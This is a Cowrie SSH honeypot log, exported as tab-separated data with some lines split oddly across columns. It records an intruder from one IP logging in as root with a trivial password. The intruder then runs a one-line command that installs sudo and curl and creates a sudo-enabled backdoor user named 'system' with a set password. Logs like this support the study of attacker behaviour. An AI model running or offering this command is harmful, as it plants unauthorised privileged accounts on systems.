2023-11-27T04:04:03+0000	[-] Python Version 3.11.2 (main, Mar 13 2023, 12:18:29) [GCC 12.2.0]	Unnamed: 2	Unnamed: 3	Unnamed: 4
2023-12-03T16:43:19+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ecdsa-sha2-n	is	tp2	56'
2023-12-03T16:43:19+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'			
2023-12-03T16:43:19+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'			
2023-12-03T16:43:20+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] NEW KEYS			
2023-12-03T16:43:20+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'			
2023-12-03T16:43:21+0000	[cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' trying auth b'none'			
2023-12-03T16:43:22+0000	[cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' trying auth b'password'			
2023-12-03T16:43:22+0000	[HoneyPotSSHTransport,4,167.71.169.227] Could not read etc/userdb.txt, default database activated			
2023-12-03T16:43:22+0000	[HoneyPotSSHTransport,4,167.71.169.227] login attempt [b'root'/b'0'] succeeded			
2023-12-03T16:43:22+0000	[HoneyPotSSHTransport,4,167.71.169.227] Initialized emulated server as architecture: linux-x64-lsb			
2023-12-03T16:43:22+0000	[cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' authenticated with b'password'			
2023-12-03T16:43:22+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-connection'			
2023-12-03T16:43:23+0000	[cowrie.ssh.connection.CowrieSSHConnection#debug] got channel b'session' request			
2023-12-03T16:43:23+0000	[cowrie.ssh.session.HoneyPotSSHSession#info] channel open			
2023-12-03T16:43:24+0000	"[twisted.conch.ssh.session#info] Executing command ""b'apt update && apt install sudo curl -y && sudo"	us	era	"dd -m -p $(openssl passwd -1 bvyJBVjM) system && sudo usermod -aG sudo system && sudo usermod -aG sudo system'"""
2023-12-03T16:43:24+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,4,167.71.169.227] CMD	:	apt	update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 bvyJBVjM) system && sudo usermod -aG sudo system && sudo usermod -aG sudo system
2023-12-03T16:43:24+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,4,167.71.169.227] CMD	:	ope	nssl passwd -1 bvyJBVjM
2023-12-03T16:43:24+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,4,167.71.169.227] Can	't	fi	nd command openssl
2023-12-03T16:43:24+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,4,167.71.169.227] Com	ma	nd	not found: openssl passwd -1 bvyJBVjM
2023-12-03T16:43:24+0000	[twisted.conch.ssh.session#info] exitCode: 0			
2023-12-03T16:43:24+0000	[cowrie.ssh.connection.CowrieSSHConnection#debug] sending request b'exit-status'			
